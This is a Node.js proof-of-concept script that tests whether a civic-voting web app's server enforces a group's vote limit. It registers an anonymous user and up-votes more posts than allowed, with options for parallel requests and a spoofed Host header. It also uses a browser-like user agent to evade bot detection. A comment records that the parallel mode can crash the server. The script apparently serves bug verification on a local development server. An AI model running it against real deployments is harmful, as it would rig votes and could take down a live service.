// Shows that the server does not enforce a group's maxNumberOfGroupVotes:
// registers one anonymous user, up-votes every given post directly through
// the API, then asks the server how many up-votes that user holds in the
// group.
//
// Usage:
//   node prove-vote-limit-bypass.mjs --group-id 1 --post-ids 1,2,3 --max 2 \
//     [--base-url http://localhost:4242] [--parallel] [--host-header <host>]
//
// --parallel sends all the votes at once instead of one after another, to
// test for a race between counting and saving votes.
//
// Note: when we ran --parallel against a local dev server, the server
// sometimes exited, apparently because each vote request tries to add the
// new user to the group (Group.addUserToGroupIfNeeded) and the duplicate
// insert causes an unhandled rejection. This needs investigation.
//
// --host-header sends a different Host header from the one in --base-url.
// The server picks the domain from the Host header, so this lets a second
// server on another port answer as the usual localhost:4242 domain.
//
// No dependencies.

import http from "node:http";
import https from "node:https";
import { parseArgs } from "node:util";

const { values } = parseArgs({
  options: {
    "base-url": { type: "string", default: "http://localhost:4242" },
    "group-id": { type: "string" },
    "post-ids": { type: "string" },
    max: { type: "string" },
    parallel: { type: "boolean", default: false },
    "host-header": { type: "string" },
  },
});

const baseUrl = values["base-url"].replace(/\/$/, "");
const groupId = Number(values["group-id"]);
const postIds = (values["post-ids"] ?? "")
  .split(",")
  .filter(Boolean)
  .map(Number);
const max = Number(values.max);

if (!groupId || postIds.length === 0 || !max) {
  console.error(
    "Usage: node prove-vote-limit-bypass.mjs --group-id <id> --post-ids <id,id,...> --max <maxNumberOfGroupVotes> [--base-url <url>]"
  );
  process.exit(1);
}

if (postIds.length <= max) {
  console.error(
    `Need more posts (${postIds.length}) than the vote limit (${max}) to prove anything.`
  );
  process.exit(1);
}

// Minimal cookie jar: we only care about the session cookie, which the
// server may replace (passport regenerates the session on login).
let cookie = "";

// Uses node:http rather than fetch, because fetch won't send a custom Host
// header.
function request(method, path, body) {
  const url = new URL(`${baseUrl}/api${path}`);
  const payload = body ? JSON.stringify(body) : undefined;
  const transport = url.protocol === "https:" ? https : http;

  return new Promise((resolve, reject) => {
    const req = transport.request(
      url,
      {
        method,
        headers: {
          "content-type": "application/json",
          // A browser-like UA, so the bot-detection middleware leaves us
          // alone.
          "user-agent":
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36",
          ...(values["host-header"] ? { host: values["host-header"] } : {}),
          ...(cookie ? { cookie } : {}),
          ...(payload ? { "content-length": Buffer.byteLength(payload) } : {}),
        },
      },
      (response) => {
        const setCookie = (response.headers["set-cookie"] ?? []).find((c) =>
          c.startsWith("yrpri.sid=")
        );
        if (setCookie) cookie = setCookie.split(";")[0];

        let text = "";
        response.setEncoding("utf8");
        response.on("data", (chunk) => (text += chunk));
        response.on("end", () => {
          let json;
          try {
            json = JSON.parse(text);
          } catch {
            json = undefined;
          }
          resolve({ status: response.statusCode, json, text });
        });
      }
    );
    req.on("error", reject);
    if (payload) req.write(payload);
    req.end();
  });
}

// 1. Become an anonymous user, as the client does for an anonymous group.
const registration = await request("POST", "/users/register_anonymously", {
  groupId,
});
if (registration.status !== 200 || !registration.json?.id) {
  console.error(
    `Anonymous registration failed (HTTP ${registration.status}): ${registration.text}`
  );
  process.exit(1);
}
const userId = registration.json.id;
console.log(`Registered anonymous user ${userId}`);

// 2. Up-vote every post, ignoring the limit the UI would apply.
async function upVote(postId) {
  const vote = await request("POST", `/posts/${postId}/endorse`, {
    post_id: postId,
    value: 1,
  });
  console.log(
    `Up-vote on post ${postId}: HTTP ${vote.status}${
      vote.status === 200 ? "" : ` ${vote.text}`
    }`
  );
}

if (values.parallel) {
  await Promise.all(postIds.map(upVote));
} else {
  for (const postId of postIds) await upVote(postId);
}

// 3. Ask the server what it now holds for this user. Same count as the
// client's calculateVotesLeftForGroup.
const me = await request("GET", "/users/loggedInUser/isloggedin");
if (me.json?.id !== userId) {
  console.error(
    `Session check returned a different or no user (HTTP ${me.status}): ${me.text}`
  );
  process.exit(1);
}
const upVotesInGroup = (me.json.Endorsements ?? []).filter(
  (e) => e.Post?.group_id === groupId && e.value > 0
).length;

console.log(
  `\nUser ${userId} now holds ${upVotesInGroup} up-votes in group ${groupId} (limit ${max}).`
);
if (upVotesInGroup > max) {
  console.log("PROVEN: the server accepted more votes than the limit.");
} else {
  console.log("NOT PROVEN: the server did not accept more votes than the limit.");
  process.exit(2);
}
